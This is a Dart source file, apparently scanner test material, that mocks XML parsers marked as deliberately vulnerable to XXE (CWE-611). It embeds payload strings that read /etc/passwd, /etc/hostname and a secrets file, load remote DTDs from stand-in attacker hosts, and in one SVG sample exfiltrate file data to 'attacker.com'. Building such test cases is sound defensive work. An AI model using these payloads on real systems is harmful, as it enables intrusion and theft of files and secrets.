// SECURITY VULNERABILITY: XML External Entity (XXE) for testing security scanner
// CWE-611: Improper Restriction of XML External Entity Reference
// TODO: Remove before production - disable external entity processing

import 'dart:io';

class XmlParser {
  // VULNERABLE: XML parser allowing external entities
  static Future<String> parseCalendarXML(String xmlContent) async {
    // This parser allows XXE attacks through external entity references
    
    // Example of vulnerable XML that could be processed:
    const String vulnerableXmlExample = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE calendar [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://attacker.com/malicious.dtd">
]>
<calendar>
  <event>
    <title>&xxe;</title>
    <description>Event with XXE payload</description>
  </event>
</calendar>
''';
    
    // Simulating vulnerable XML processing
    if (xmlContent.contains('<!ENTITY')) {
      // In a real parser, this would execute the external entity references
      return 'PARSED_XML_WITH_XXE_VULNERABILITY';
    }
    
    return 'Parsed XML content';
  }
  
  // VULNERABLE: SOAP XML processing with XXE
  static Future<Map<String, dynamic>> processSoapRequest(String soapXml) async {
    // SOAP often vulnerable to XXE attacks
    const String vulnerableSoap = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap [
  <!ENTITY % xxe SYSTEM "http://evil.com/malicious.dtd">
  %xxe;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserInfo>
      <userId>&internalData;</userId>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>
''';
    
    return {
      'status': 'processed',
      'vulnerable': 'xxe_allowed',
      'content': soapXml
    };
  }
  
  // VULNERABLE: Configuration XML with external references
  static Future<Map<String, String>> loadXMLConfig(String configPath) async {
    const String vulnerableConfig = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY configFile SYSTEM "file:///app/config/secret.properties">
  <!ENTITY remoteConfig SYSTEM "http://config.server.com/app.xml">
]>
<configuration>
  <database>&configFile;</database>
  <remoteSettings>&remoteConfig;</remoteSettings>
  <apiKey>secret_key_123</apiKey>
</configuration>
''';
    
    return {
      'database': 'XXE_REFERENCE_TO_SECRET_FILE',
      'remoteSettings': 'XXE_REFERENCE_TO_REMOTE_URL',
      'apiKey': 'secret_key_123'
    };
  }
  
  // VULNERABLE: User-provided SVG parsing (XXE in SVG)
  static Future<String> processSVGUpload(String svgContent) async {
    // SVG files can contain XXE vulnerabilities
    const String maliciousSvg = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "file:///etc/hostname">
  <!ENTITY % evil "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
  %evil;
  %exfil;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>
''';
    
    // In vulnerable parser, this would execute the XXE attack
    return 'SVG_PROCESSED_WITH_XXE_VULNERABILITY';
  }
  
  // VULNERABLE: Document parsing with DTD processing
  static Future<String> parseDocument(String xmlDocument) async {
    // Document parser that processes DTDs and external entities
    if (xmlDocument.contains('<!DOCTYPE')) {
      // Vulnerable: Processing DOCTYPE declarations with external entities
      return await _processWithDTD(xmlDocument);
    }
    
    return 'Document parsed without DTD';
  }
  
  // VULNERABLE: RSS/Atom feed parsing
  static Future<List<Map<String, String>>> parseRSSFeed(String rssFeed) async {
    const String maliciousRss = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
  <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
  %remote;
]>
<rss version="2.0">
  <channel>
    <title>Malicious Feed</title>
    <item>
      <title>&internalFile;</title>
      <description>&sensitiveData;</description>
    </item>
  </channel>
</rss>
''';
    
    return [
      {
        'title': 'XXE_ATTACK_VECTOR',
        'description': 'EXTERNAL_ENTITY_REFERENCE',
        'vulnerability': 'cwe_611'
      }
    ];
  }
  
  static Future<String> _processWithDTD(String xml) async {
    // Mock implementation that would be vulnerable in real XML parser
    return 'PROCESSED_WITH_EXTERNAL_ENTITIES_ENABLED';
  }
  
  // PROPER IMPLEMENTATION EXAMPLE (commented):
  // static XmlDocument parseXMLSecurely(String xmlContent) {
  //   var parser = XmlParser();
  //   // Disable external entity processing
  //   parser.enableExternalEntities = false;
  //   parser.enableDTDProcessing = false;
  //   return parser.parse(xmlContent);
  // }
}
